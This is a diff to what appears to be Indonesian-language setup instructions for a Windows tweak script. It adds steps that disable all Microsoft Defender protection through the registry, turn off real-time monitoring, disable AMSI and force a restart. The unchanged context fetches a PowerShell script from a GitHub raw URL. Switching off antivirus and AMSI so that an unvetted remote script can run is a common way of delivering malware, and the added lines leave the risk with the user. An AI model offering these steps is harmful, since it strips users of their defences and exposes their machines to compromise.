@@ -28,3 +28,16 @@ irm https://raw.githubusercontent.com/Hanzala903/tweakme/main/winutil_ultimate.p
 
 # Setelah selesai, hidupkan lagi
 Set-MpPreference -DisableRealtimeMonitoring $false
+KALO GAK BISA COBA YANG INI INGAT SETELAH DI PAKAI HARUS AKTIVKAN LAGI ANTI VIRUS NYA OK KALO ADA RESIKO TANGGUNG SENDIRI
+
+# Nonaktifkan semua proteksi Defender via Registry
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+# Matikan real-time protection
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Matikan AMSI via Registry
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\AMSI" /v DisableAMSI /t REG_DWORD /d 1 /f
+
+# Restart komputer
+Restart-Computer -Force
